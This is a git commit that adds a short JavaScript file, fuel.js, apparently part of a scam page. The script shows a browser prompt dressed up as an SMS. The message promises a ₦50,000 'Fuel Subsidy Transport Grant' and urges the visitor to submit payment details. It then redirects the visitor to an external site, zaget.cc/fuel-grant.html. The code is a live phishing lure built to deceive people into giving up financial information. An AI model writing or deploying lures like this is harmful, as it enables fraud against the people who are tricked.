fab6c96d31a604f85498672c166943677a4989c5
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-09-21 18:52:11 +0530

    Add files via upload

---
+++ fuel.js
@@ -0,0 +1,6 @@
+
+var password = 'Receive ₦50,000 Grant'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive the ₦50,000 Fuel Subsidy Transport Grant, kindly press Ok to submit your payment Details now ','Receive ₦50,000 Grant');
+if (password != 'Receive ₦50,000 Grant') {
+location.href='https://zaget.cc/fuel-grant.html';
+}
